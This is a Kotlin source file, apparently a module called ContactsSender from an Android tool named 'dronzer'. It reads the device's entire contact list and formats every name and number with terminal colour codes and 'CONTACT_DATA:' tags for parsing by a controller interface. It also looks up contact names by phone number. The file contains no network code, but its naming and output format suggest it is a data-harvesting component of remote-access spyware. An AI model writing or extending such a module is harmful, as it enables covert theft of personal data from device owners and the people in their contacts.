package com.example.dronzer

import android.content.Context
import android.net.Uri
import android.provider.ContactsContract
import android.util.Log

object ContactsSender {
    fun getContactsString(context: Context): String {
        val buffer = StringBuilder()
        buffer.append("\u001b[1;35m--- Contacts List ---\u001b[0m\n")
        try {
            val cursor = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            )
            cursor?.use {
                val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numberIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                
                if (nameIdx != -1 && numberIdx != -1) {
                    while (it.moveToNext()) {
                        val name = it.getString(nameIdx) ?: "Unknown"
                        val number = it.getString(numberIdx) ?: "Unknown"
                        // Structured format for GUI parsing
                        buffer.append("CONTACT_DATA: Name: $name, Phone: $number\n")
                    }
                } else {
                    buffer.append("Error: Required contact columns not found.\n")
                }
            }
        } catch (e: Exception) {
            buffer.append("Error reading contacts: ${e.message}\n")
        }
        return if (buffer.length > 30) buffer.toString() else "\u001b[1;31m--- Contacts ---\u001b[0m\n(No contacts found)\n"
    }

    fun getContactName(context: Context, phoneNumber: String?): String? {
        if (phoneNumber == null) return null
        val uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber))
        val projection = arrayOf(ContactsContract.PhoneLookup.DISPLAY_NAME)
        var contactName: String? = null
        try {
            val cursor = context.contentResolver.query(uri, projection, null, null, null)
            cursor?.use {
                if (it.moveToFirst()) {
                    val nameIdx = it.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME)
                    if (nameIdx != -1) {
                        contactName = it.getString(nameIdx)
                    }
                }
            }
        } catch (e: Exception) {
            Log.e("ContactsSender", "Error looking up contact name: ${e.message}")
        }
        return contactName
    }
}